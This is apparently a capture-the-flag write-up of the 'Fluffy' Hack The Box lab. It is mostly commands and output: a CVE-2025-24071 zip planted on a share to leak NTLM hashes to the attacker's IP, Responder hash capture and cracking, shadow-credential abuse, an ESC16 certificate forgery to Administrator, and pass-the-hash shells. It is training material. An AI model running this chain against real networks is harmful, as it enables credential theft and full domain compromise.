# Port scan
```
# Nmap 7.95 scan initiated Sat Jul 12 06:10:08 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.69
Nmap scan report for 10.10.11.69
Host is up (0.29s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-11 17:11:35Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-11T17:13:12+00:00; -2h59m06s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-11T17:13:13+00:00; -2h59m06s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-11T17:13:12+00:00; -2h59m06s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-11T17:13:13+00:00; -2h59m06s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -2h59m06s, deviation: 1s, median: -2h59m06s
| smb2-time: 
|   date: 2025-07-11T17:12:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 12 06:12:21 2025 -- 1 IP address (1 host up) scanned in 132.91 seconds
```

## Port 445 SMB

I would prefer to start with smb service because we have known the credit 
```
Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
```

Let's check it by `smbmap` and `smbclient`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.69:445 Name: 10.10.11.69               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                           
```

Let's enumerate them manually
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ smbclient  //10.10.11.69/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 12 03:16:54 2025
  ..                                  D        0  Sat Jul 12 03:16:54 2025
  Everything-1.4.1.1026.x64           D        0  Sat Apr 19 01:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Sat Apr 19 01:04:05 2025
  KeePass-2.58                        D        0  Sat Apr 19 01:08:38 2025
  KeePass-2.58.zip                    A  3225346  Sat Apr 19 01:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sun May 18 00:31:07 2025

                5842943 blocks of size 4096. 2224986 blocks available
smb: \> download Upgrade_Notice.pdf
download: command not found
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (26.9 KiloBytes/sec) (average 26.9 KiloBytes/sec)
smb: \> 

```

Let's check what information from this pdf.
![](images/Pasted%20image%2020250712061919.png)
There are a few vulners here and we can check them one by one.
The most interesting one is `CVE-2025-24071`
`CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File Resources`
There are poc links
```
https://github.com/0x6rss/CVE-2025-24071_PoC

https://github.com/TH-SecForge/CVE-2025-24071
```

And think about this line from `smbmap`: 
`IT                                                      READ, WRITE`
That means we can upload files into this directory.

# CVE-2025-24071

Let's try to create the exploited malware and leak the `NTLM Hash`.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ python3 poc.py   
Enter your file name: exploit
Enter IP (EX: 192.168.1.162): 10.10.14.16
completed
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ ls
README.md  exploit.zip  poc.py

┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ smbclient  //10.10.11.69/IT -U j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> put exploit.zip 
putting file exploit.zip as \exploit.zip (0.3 kb/s) (average 0.3 kb/s)
smb: \> 
```

Then we need to listen the tun0 by `responder`
```
responder -I tun0 -wvF
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.75]
    Responder IPv6             [dead:beef:4::1049]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-DU8IDYUEGAF]
    Responder Domain Name      [3CGF.LOCAL]
    Responder DCE-RPC Port     [48866]

[+] Listening for events...                                                                                                                     

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C05900F433F9FAB0C71959703:0101000000000000809AE9316CD0DB012ECCE7CE4B886DE00000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                                                                                                                              
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                         
```

Then we can use john to crack the `NTLM hash`
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)   
```

# BloodHound by p.agila
Then let's use bloodhound to find something interesting here.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ sudo ntpdate dc01.fluffy.htb
2025-07-12 03:34:48.037561 (+1000) -10616.260464 +/- 0.186001 dc01.fluffy.htb 10.10.11.69 s1 no-leap
CLOCK: time stepped by -10616.260464
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 01M 04S
INFO: Compressing output into 20250712033454_bloodhound.zip
```

Then let's start the `Neo4j` and `bloodhound`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ sudo neo4j start            
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:16686). It is available at http://localhost:7474
There may be a short delay until the server is ready.
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy/CVE-2025-24071_PoC]
└─$ bloodhound                                                                                      
(node:16806) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron.  See https://github.com/electron/electron/issues/23506 for more information
(node:16852) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.

```

![](images/Pasted%20image%2020250712034141.png)Firstly, I noticed that `p.agila` can add itself to the service user group

![](images/Pasted%20image%2020250712034321.png)
Then the service group has write permission for the `CA_SVC` user

Let's exploit them one by one:
Firstly, add `p.agila` to the group
```
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila    
⏎
[+] p.agila added to SERVICE ACCOUNTS
```

Because `SERVICE ACCOUNTS` has `GenericWrite` permissions for accounts such as `ca_svc, ldap_svc, winrm_svc, etc.`, it means that custom `KeyCredentials (shadow certificates)` can be added to these accounts.

# Shadow Credential

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '85f9c349-edd2-22a8-61ad-2283f066cfe8'
[*] Adding Key Credential with device ID '85f9c349-edd2-22a8-61ad-2283f066cfe8' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '85f9c349-edd2-22a8-61ad-2283f066cfe8' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

Then we can use `evil-winrm` to connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

And you can find the user.txt from this account.

# ESC16

I did not find anything interesting from `winrm_svc` account. So I would continue to check the other account `CA_SVC`

```
certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable   

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250529120822_Certipy.txt'
[*] Wrote text output to '20250529120822_Certipy.txt'
[*] Saving JSON output to '20250529120822_Certipy.json'
[*] Wrote JSON output to '20250529120822_Certipy.json'

[root@kali] /home/kali/Fluffy  
❯ cat 20250529120822_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```
`ESC16` vulnerability exists
This link would be needed here
```
https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
```

Let's follow the document to exploit one by one:

Step 1: Read the initial UPN of the victim account
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-07-11T18:22:07+00:00

```

Step 2: Update the victim account’s `UPN` to the target admin’s `sAMAccountName`.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Step 3: Request a certificate issued as the "victim" user from any suitable client authentication template* (e.g., "user") on the CA vulnerable to `ESC16`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '25e5a91c-c741-b085-fb61-e4b3dfaf4f07'
[*] Adding Key Credential with device ID '25e5a91c-c741-b085-fb61-e4b3dfaf4f07' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '25e5a91c-c741-b085-fb61-e4b3dfaf4f07' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

export KRB5CCNAME=ca_svc.ccache
```

Then request a certificate
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Step 4: Restore the UPN of the "victim" account.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update   
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'           ⏎
```

Step 5: Authenticate as the target administrator
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Then we can use `evil-winrm` to connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Fluffy]
└─$ evil-winrm -i 10.10.11.69 -u 'administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Finally we get the shell as Administrator.

# Description

During this range, I realized that my `certipy-ad` version was too low, which caused some inaccurate problems when scanning and collecting information.

However, I haven't updated this system for a long time, and then a problem occurred that the public key verification of `sudo apt update` failed. If you also have this problem, please refer to the official link:
```
https://www.kali.org/blog/new-kali-archive-signing-key/
```

In addition, we must always remember that in a domain environment, the time zone of the local machine should always be kept consistent with the time zone of the domain control server. Otherwise, we will not be able to obtain the `TGT` ticket normally, and naturally we will not be able to obtain the correct bloodhound results.

`sudo ntpdate dc01.fluffy.htb`